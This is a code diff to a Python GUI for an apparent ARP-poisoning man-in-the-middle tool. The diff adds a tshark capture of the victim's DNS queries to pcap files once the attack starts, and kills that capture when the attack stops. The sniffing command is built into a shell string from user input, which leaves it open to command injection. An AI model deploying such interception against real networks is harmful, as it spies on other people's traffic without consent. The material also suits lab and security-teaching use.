@@ -1,4 +1,6 @@
 import sys
+import time 
+import os
 
 from attack import *
 from PySide2.QtUiTools import QUiLoader
@@ -28,6 +30,7 @@ class Form(QObject):
         self.btn_launch_attack.clicked.connect(self.attack_handler)
         self.btn_stop_attack = self.window.findChild(QPushButton, 'stopArpAttack')
         self.btn_stop_attack.clicked.connect(self.stop_attack_handler)
+        self.pid_tshark = None
         self.window.show()
  
     def scan_handler(self):
@@ -45,8 +48,14 @@ class Form(QObject):
             arp_mitm_attack(target_IP, target_MAC, router_IP)
         else:
             print('You need to fill parameters needed for the ARP Poisonning...')
-    
+            
+        #Log all sniffed DNS queries
+        cmd = 'tshark -f "src ' + str(target_IP) + ' and port 53 and not icmp" -w ./Sniffing_Logs/'+ str(int(time.time())) + '.pcap'
+        sniffing_process = subprocess.Popen([cmd], shell=True, preexec_fn=os.setsid) 
+        self.pid_tshark = sniffing_process.pid
+
     def stop_attack_handler(self):
+        os.killpg(os.getpgid(self.pid_tshark), signal.SIGTERM)
         stop_attack()
 
 if __name__ == '__main__':
